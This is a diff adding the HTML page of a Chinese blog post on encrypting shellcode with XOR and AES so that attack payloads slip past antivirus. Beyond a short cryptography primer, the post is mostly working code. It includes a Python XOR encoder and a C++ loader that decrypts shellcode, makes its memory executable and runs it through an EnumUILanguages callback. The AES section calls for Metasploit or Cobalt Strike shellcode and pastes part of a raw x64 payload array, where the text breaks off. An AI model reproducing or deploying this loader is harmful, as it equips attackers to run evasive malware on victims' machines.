@@ -1,0 +1,588 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-mac-osx.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言什么是私钥和公钥私钥和公钥是密码学中用于实现加密、解密和数字签名等功能的关键组件。 私钥是一种加密算法中的秘密密钥，只有密钥的拥有者可以访问和使用它。私钥通常用于数字签名和数据加密等场景中，它可以用于对数据进行加密，同时也可以用于解密已经被加密的数据。 公钥是与私钥对应的一种公开密钥，它可以被任何人访问和使用。公钥通常用于数据加密、身份认证和数字签名等场景中。公钥可以被用来加密数据，同时也可以">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Chensicha‘s blogs">
+<meta property="og:url" content="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/index.html">
+<meta property="og:site_name" content="Chensicha‘s blogs">
+<meta property="og:description" content="前言什么是私钥和公钥私钥和公钥是密码学中用于实现加密、解密和数字签名等功能的关键组件。 私钥是一种加密算法中的秘密密钥，只有密钥的拥有者可以访问和使用它。私钥通常用于数字签名和数据加密等场景中，它可以用于对数据进行加密，同时也可以用于解密已经被加密的数据。 公钥是与私钥对应的一种公开密钥，它可以被任何人访问和使用。公钥通常用于数据加密、身份认证和数字签名等场景中。公钥可以被用来加密数据，同时也可以">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/shellcode%E5%8A%A0%E5%AF%86/image-20230704205027631.png">
+<meta property="og:image" content="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/shellcode%E5%8A%A0%E5%AF%86/image-20230704205212610.png">
+<meta property="og:image" content="http://example.com/shellcode%E5%8A%A0%E5%AF%86/image-20230704205433520.png">
+<meta property="og:image" content="http://example.com/shellcode%E5%8A%A0%E5%AF%86/image-20230704205613170.png">
+<meta property="og:image" content="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/shellcode%E5%8A%A0%E5%AF%86/image-20230516154853419.png">
+<meta property="og:image" content="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/shellcode%E5%8A%A0%E5%AF%86/image-20230516155107883.png">
+<meta property="og:image" content="http://example.com/shellcode%E5%8A%A0%E5%AF%86/image-20230515195113865.png">
+<meta property="og:image" content="http://example.com/shellcode%E5%8A%A0%E5%AF%86/image-20230515195404012.png">
+<meta property="og:image" content="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/shellcode%E5%8A%A0%E5%AF%86/image-20230515201325408.png">
+<meta property="og:image" content="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/shellcode%E5%8A%A0%E5%AF%86/image-20230515201541815.png">
+<meta property="og:image" content="http://example.com/shellcode%E5%8A%A0%E5%AF%86/image-20230516154122994.png">
+<meta property="article:published_time" content="2024-04-29T07:43:25.473Z">
+<meta property="article:modified_time" content="2023-08-26T09:09:52.000Z">
+<meta property="article:author" content="Xiao Ni">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/shellcode%E5%8A%A0%E5%AF%86/image-20230704205027631.png">
+
+<link rel="canonical" href="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title> | Chensicha‘s blogs</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Chensicha‘s blogs</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-留言">
+
+    <a href="/guestbook/" rel="section"><i class="fa fa-book fa-fw"></i>留言</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/29/shellcode%E5%8A%A0%E5%AF%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://pic4.zhimg.com/v2-5fd49bc92c06b3f913801f4a46179aeb_r.jpg">
+      <meta itemprop="name" content="Xiao Ni">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chensicha‘s blogs">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-04-29 15:43:25" itemprop="dateCreated datePublished" datetime="2024-04-29T15:43:25+08:00">2024-04-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-26 17:09:52" itemprop="dateModified" datetime="2023-08-26T17:09:52+08:00">2023-08-26</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="什么是私钥和公钥"><a href="#什么是私钥和公钥" class="headerlink" title="什么是私钥和公钥"></a>什么是私钥和公钥</h2><p>私钥和公钥是密码学中用于实现加密、解密和数字签名等功能的关键组件。</p>
+<p>私钥是一种加密算法中的秘密密钥，只有密钥的拥有者可以访问和使用它。私钥通常用于数字签名和数据加密等场景中，它可以用于对数据进行加密，同时也可以用于解密已经被加密的数据。</p>
+<p>公钥是与私钥对应的一种公开密钥，它可以被任何人访问和使用。公钥通常用于数据加密、身份认证和数字签名等场景中。公钥可以被用来加密数据，同时也可以用于验证数字签名的有效性。</p>
+<p>在非对称加密算法中，公钥和私钥是一对密钥，它们共同参与加密和解密过程。公钥用于加密数据，而私钥用于解密数据。因此，使用非对称加密算法时，数据的接收方会将其私钥保存为秘密，而将其公钥发送给发送方。这样，发送方就可以使用接收方的公钥来加密数据，而接收方可以使用其私钥来解密数据。</p>
+<p>需要注意的是，私钥和公钥是成对出现的，它们必须同时使用才能确保数据的安全性和完整性。因此，在使用私钥和公钥进行数据加密、解密和数字签名等操作时，必须确保私钥的安全性和保密性</p>
+<h2 id="了解对称加密和非对称加密"><a href="#了解对称加密和非对称加密" class="headerlink" title="了解对称加密和非对称加密"></a>了解对称加密和非对称加密</h2><ul>
+<li>对称加密：在对称加密中，加密和解密使用的是同一个密钥，通常称为共享密钥。这意味着在加密数据时，发送方和接收方都需要使用相同的密钥。对称加密算法的速度较快，适用于对大量数据进行加密。然而，对称加密的一个主要缺点是密钥管理。由于发送方和接收方需要使用相同的密钥，因此密钥的安全传输和存储成为一个挑战。一旦密钥被泄露，加密数据的安全性就会受到威胁。常见的对称加密算法有：AES（高级加密标准）、DES（数据加密标准）和3DES（三重数据加密标准）。</li>
+<li>非对称加密：非对称加密使用一对密钥，分别称为公钥和私钥。公钥是公开的，可以被任何人获取，而私钥是保密的，只有密钥所有者才能访问。在非对称加密中，数据可以用公钥加密，然后只能用相应的私钥解密；反之亦然，用私钥加密的数据只能用公钥解密。这样，密钥的管理问题得到了解决，因为只需要保护私钥的安全。非对称加密的一个缺点是加密和解密过程相对较慢，因此通常不适用于加密大量数据。常见的非对称加密算法有：RSA（Rivest-Shamir-Adleman）、DSA（数字签名算法）和ECC（椭圆曲线密码学）。</li>
+</ul>
+<p>在实际应用中，对称加密和非对称加密通常会结合使用，以充分利用两者的优点。例如，通过非对称加密安全地传输对称加密的密钥，然后使用对称加密对数据进行加密。这样既解决了密钥管理问题，又能快速地加密大量数</p>
+<h1 id="XOR加密"><a href="#XOR加密" class="headerlink" title="XOR加密"></a>XOR加密</h1><h2 id="什么是xor加密"><a href="#什么是xor加密" class="headerlink" title="什么是xor加密"></a>什么是xor加密</h2><p>XOR加密又称为异或加密，异或加密属于对称加密。在异或加密中，使用一个密钥（通常称为密钥流）与明文数据进行异或操作，生成加密后的密文。解密过程与加密过程相同，将密文与相同的密钥流进行异或操作，即可恢复原始明文数据</p>
+<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>使用<code>Shellcode_XorEncoder.py</code>对shellcode进行异或加密，随后输出加密后的shellcode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义异或加密函数，接收原始shellcode和密钥作为输入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_encrypt</span>(<span class="params">shellcode, key</span>):</span><br><span class="line">    encrypted_shellcode = <span class="built_in">bytearray</span>()</span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 遍历shellcode中的每个字节</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(shellcode)):</span><br><span class="line">        <span class="comment"># 将当前字节与密钥中相应字节进行异或操作，然后添加到加密后的shellcode中</span></span><br><span class="line">        <span class="comment"># 这段代码中的i % key_len操作用于确保在对shellcode进行异或加密时，密钥循环使用</span></span><br><span class="line">        encrypted_shellcode.append(shellcode[i] ^ key[i % key_len])</span><br><span class="line">    <span class="keyword">return</span> encrypted_shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 填写你的shellcode</span></span><br><span class="line">    <span class="comment"># buf = b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#通过bin文件获取shellcode</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;payload.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        buf = file.read()</span><br><span class="line"></span><br><span class="line">    shellcode = <span class="built_in">bytearray</span>(buf)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 定义密钥</span></span><br><span class="line">    key = <span class="built_in">bytearray</span>(<span class="string">b&#x27;12henry1222345??6aa+-==@asd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用xor_encrypt函数加密shellcode</span></span><br><span class="line">    encrypted_shellcode = xor_encrypt(shellcode, key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出加密后的shellcode</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Encrypted shellcode:&quot;</span>)</span><br><span class="line">    encrypted_shellcode_string = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> encrypted_shellcode:</span><br><span class="line">        encrypted_shellcode_string += (<span class="string">&quot;\\x%02x&quot;</span>%byte)</span><br><span class="line">    <span class="built_in">print</span>(encrypted_shellcode_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>使用<code>xor加密.cpp</code>解密加密后的shellcode，随后将其加载进内存</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 存放xor加密后的shellcode</span></span><br><span class="line">    <span class="type">char</span> encryptedShellcode[] = <span class="string">&quot;...&quot;</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义解密所用的密钥</span></span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;12henry1222345??6aa+-==@asd&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个与加密shellcode大小相同的数组用于存储解密后的shellcode</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="keyword">sizeof</span> encryptedShellcode];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取密钥的长度</span></span><br><span class="line">    <span class="type">int</span> keylength = <span class="built_in">strlen</span>(key);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历加密的shellcode，并使用异或操作进行解密，将结果存储在shellcode数组中</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> encryptedShellcode; i++) &#123;</span><br><span class="line">        shellcode[i] = encryptedShellcode[i] ^ key[i % keylength];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\\x%x&quot;</span>, shellcode[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取解密后的shellcode的地址</span></span><br><span class="line">    <span class="type">char</span>* addrShellcode = (<span class="type">char</span>*)shellcode;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明一个DWORD变量用于存储旧的内存保护属性</span></span><br><span class="line">    DWORD dwOldPro = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更改解密后的shellcode所在内存区域的保护属性，允许执行、读、写</span></span><br><span class="line">    BOOL ifExec = <span class="built_in">VirtualProtect</span>(addrShellcode, <span class="built_in">sizeof</span>(shellcode), PAGE_EXECUTE_READWRITE, &amp;dwOldPro);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用EnumUILanguages函数执行解密后的shellcode</span></span><br><span class="line">    <span class="built_in">EnumUILanguages</span>((UILANGUAGE_ENUMPROC)addrShellcode, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>若要加密stageless的shellcode, 有两种方法, 首先第一种是通过010editor打开bin文件获取python形式的buf, 随后粘贴到<code>Shellcode_XorEncoder.py</code></p>
+<img src="shellcode加密/image-20230704205027631.png" alt="image-20230704205027631" style="zoom:67%;" />	
+
+
+
+<p>还有一种是直接打开bin文件获取shellcode, 我更加推荐使用这种</p>
+<img src="shellcode加密/image-20230704205212610.png" alt="image-20230704205212610" style="zoom:67%;" />	
+
+
+
+<p>运行<code>Shellcode_XorEncoder.py</code>后将控制台输出的加密后的shellcode复制到<code>xor加密.cpp</code></p>
+<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230704205433520.png" alt="image-20230704205433520"></p>
+<p><img src="/shellcode%E5%8A%A0%E5%AF%86/image-20230704205613170.png" alt="image-20230704205613170"></p>
+<p>​		</p>
+<h1 id="AES加密"><a href="#AES加密" class="headerlink" title="AES加密"></a>AES加密</h1><h2 id="什么是aes加密"><a href="#什么是aes加密" class="headerlink" title="什么是aes加密"></a>什么是aes加密</h2><p>AES加密，即高级加密标准（Advanced Encryption Standard）加密，是一种对称密钥加密算法，广泛应用于现代密码学中</p>
+<p>AES加密的特点如下：</p>
+<ul>
+<li>对称密钥：加密和解密过程使用相同的密钥。因此，密钥的安全性至关重要。</li>
+<li>密钥长度：AES支持128位、192位和256位三种密钥长度，安全性随密钥长度的增加而增加。</li>
+<li>分组长度：AES加密算法对数据进行分组，每个分组固定为128位（16字节）。</li>
+<li>加密过程：包括多轮（轮数与密钥长度有关，如AES-128需要10轮，AES-192需要12轮，AES-256需要14轮）的加密操作。每轮操作包括四个步骤：SubBytes（字节替换）、ShiftRows（行移位）、MixColumns（列混淆，最后一轮除外）和AddRoundKey（轮密钥加）</li>
+</ul>
+<h2 id="代码实现-1"><a href="#代码实现-1" class="headerlink" title="代码实现"></a>代码实现</h2><p>这里直接使用乌鸦师傅的aes加密代码：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1939317%EF%BC%8C%E6%88%91%E5%B0%86aes%E5%8A%A0%E5%AF%86%E7%9A%84%E5%87%BD%E6%95%B0%E5%B0%81%E8%A3%85%E5%9C%A8%E4%B8%80%E4%B8%AA%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%E9%A1%B9%E7%9B%AE%E9%87%8C%EF%BC%8C%E5%86%8D%E6%B7%BB%E5%8A%A0%E4%BA%86%E5%AF%86%E9%92%A5%E7%94%9F%E6%88%90%E5%87%BD%E6%95%B0%E5%92%8Cshellcode%E6%95%B0%E7%BB%84%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%80%E5%85%B1%E6%9C%89%E5%9B%9B%E4%B8%AA%E5%87%BD%E6%95%B0">https://cloud.tencent.com/developer/article/1939317，我将aes加密的函数封装在一个静态链接库项目里，再添加了密钥生成函数和shellcode数组转字符串函数，一共有四个函数</a></p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AES加密</span></span><br><span class="line"><span class="function">string <span class="title">EncryptionAES</span><span class="params">(<span class="type">const</span> string&amp; strSrc, <span class="type">const</span> <span class="type">char</span>* g_key, <span class="type">const</span> <span class="type">char</span>* g_iv)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//AES解密</span></span><br><span class="line"><span class="function">string <span class="title">DecryptionAES</span><span class="params">(<span class="type">const</span> string&amp; strSrc, <span class="type">const</span> <span class="type">char</span>* g_key, <span class="type">const</span> <span class="type">char</span>* g_iv)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成随机密钥</span></span><br><span class="line"><span class="function">string <span class="title">random_string</span><span class="params">(<span class="type">size_t</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将char类型的shellcode转换成string类型的</span></span><br><span class="line"><span class="function">string <span class="title">toHexString</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span>* data, <span class="type">size_t</span> len)</span></span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>Shellcode_AesEncrypt.cpp</code>对shellcode进行Aes加密</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;Shellcode加密库.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//填写msf或cs生成的shellcode</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line">	<span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50&quot;</span></span><br><span class="line">	<span class="string">&quot;\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x51&quot;</span></span><br><span class="line">	<span class="string">&quot;\x48\x8b\x52\x20\x56\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;</span></span><br><span class="line">	<span class="string">&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f&quot;</span></span><br><span class="line">	<span class="string">&quot;\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0&quot;</span></span><br><span class="line">	<span class="string">&quot;\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49&quot;</span></span><br><span class="line">	<span class="string">&quot;\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6&quot;</span></span><br><span class="line">	<span class="string">&quot;\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1&quot;</span></span><br><span class="line">	<span class="string">&quot;\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44&quot;</span></span><br><span class="line">	<span class="string">&quot;\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41&quot;</span></span><br><span class="line">	<span class="string">&quot;\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83&quot;</span></span><br><span class="line">	<span 